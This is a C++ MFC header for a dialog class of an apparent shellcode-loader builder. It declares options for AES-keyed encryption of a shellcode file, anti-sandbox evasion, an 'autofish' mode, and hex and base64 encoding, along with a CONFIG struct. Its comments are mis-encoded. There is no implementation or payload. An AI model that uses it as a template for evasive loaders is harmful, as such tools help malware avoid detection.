
// shellcodeLoaderDlg.h : ͷ�ļ�
//

#pragma once
#include "afxwin.h"
#include <random>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>

// CshellcodeLoaderDlg �Ի���
class CshellcodeLoaderDlg : public CDialogEx
{
// ����
public:
	CshellcodeLoaderDlg(CWnd* pParent = NULL);	// ��׼���캯��

// �Ի�������
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SHELLCODELOADER_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��


// ʵ��
protected:
	HICON m_hIcon;

	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	CString ShellcodePath;
	CString AESKey;
	afx_msg void OnDropFiles(HDROP hDropInfo);
	BOOL bool_x64;
	BOOL bool_autofish;
	BOOL bool_antisandbox;
	CComboBox Method;
	std::string hex_encode(const std::vector<unsigned char>& input);
	std::string base64Encode(const std::string& input);
	void StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength);
	afx_msg void OnBnClickedGenerate();
	afx_msg void OnBnClickedX64();
};


struct CONFIG
{
	BOOL antisandbox;
	BOOL autofish;
	unsigned char key[128];
};
